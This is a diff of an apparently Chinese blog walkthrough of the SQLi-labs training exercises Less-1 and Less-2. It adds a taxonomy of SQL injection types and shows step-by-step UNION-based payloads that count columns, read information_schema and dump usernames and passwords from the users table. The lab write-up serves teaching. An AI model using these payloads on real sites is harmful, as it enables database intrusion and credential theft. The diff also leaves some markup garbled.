@@ -177,11 +177,15 @@
 <p>3.?id&#x3D;1’and 1&#x3D;1 and ‘1’&#x3D;’1和?id&#x3D;1’and 1&#x3D;1 and ‘1’&#x3D;’1进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。</p>
 <p>4.?id&#x3D;1%’ and 1&#x3D;1 and ‘%’&#x3D;’%和?id&#x3D;1%’ and 1&#x3D;2 and ‘%’&#x3D;’%进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。</p>
 <p>5.?id&#x3D;1%’ and 1&#x3D;1–+&#x2F;#和?id&#x3D;1%’ and 1&#x3D;2–+&#x2F;#进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。</p>
-<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h3 id="1-1判断是否存在sql注入"><a href="#1-1判断是否存在sql注入" class="headerlink" title="1.1判断是否存在sql注入"></a>1.1判断是否存在sql注入</h3><p>1.提示输入数字值的ID作为参数，输入?id&#x3D;1</p>
+<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>根据参数类型：字符型，数字型、搜索型</p>
+<p>根据提交方式：POST注入，GET注入，HTTP HEAD注入</p>
+<p>根据有无回显：联合注入，报错注入，布尔盲注，延时注入</p>
+<p>其他注入：堆叠注入，宽字节注入，二次注入等</p>
+<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><h4 id="1-1判断是否存在sql注入"><a href="#1-1判断是否存在sql注入" class="headerlink" title="1.1判断是否存在sql注入"></a>1.1判断是否存在sql注入</h4><p>1.提示输入数字值的ID作为参数，输入?id&#x3D;1</p>
 <p>2.通过数字值不同返回的内容也不同，所以我们输入的内容是带入到数据库里面查询了。</p>
 <p>3.接下来我们判断sql语句是否是拼接，且是字符型还是数字型。</p>
 <p>4.可以根据结果指定是字符型且存在sql注入漏洞。因为该页面存在回显，所以可以使用联合查询。联合查询原理:联合查询就是两个sql语句一起查询，两张表具有相同的列数，且字段名是一样的。</p>
-<h3 id="2-2-联合注入"><a href="#2-2-联合注入" class="headerlink" title="2.2 联合注入"></a>2.2 联合注入</h3><p>1.首先知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数。</p>
+<h4 id="2-2-联合注入"><a href="#2-2-联合注入" class="headerlink" title="2.2 联合注入"></a>2.2 联合注入</h4><p>1.首先知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ?<span class="built_in">id</span>=1<span class="string">&#x27;order by 3 --+</span></span><br></pre></td></tr></table></figure>
 <p>2.爆出显示位，看看表格里面那一列是在页面显示的。可以看到是第二列和第三列里面的数据是显示在页面的。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ?<span class="built_in">id</span>=-1<span class="string">&#x27;union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
@@ -192,7 +196,8 @@
 <p>5.爆字段名，我们通过sql语句查询知道当前数据库有四个表，根据表名知道可能用户的账户和密码是在users表中。接下来我们就是得到该表下的字段名以及内容。<br>该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。（table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。）</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ?<span class="built_in">id</span>=-1<span class="string">&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
 <p>6.通过上述操作可以得到两个敏感字段就是username和password,接下来我们就要得到该字段对应的内容。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span></span><br></pre></td></tr></table></figure>
+<p>$ ?id&#x3D;-1’ union select 1,2,group_concat(username ,id , password) from users–+</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">### Less-2</span><br><span class="line"></span><br><span class="line">当我们输入单引号或者双引号可以看到报错，且报错信息看不到数字，所有我们可以猜测sql语句应该是数字型注入</span><br><span class="line"> ``` bash</span><br><span class="line">?id=1 order by 3</span><br><span class="line">?id=-1 union select 1,2,3</span><br><span class="line">?id=-1 union select 1,database(),version()</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span><br></pre></td></tr></table></figure>
       
 
       
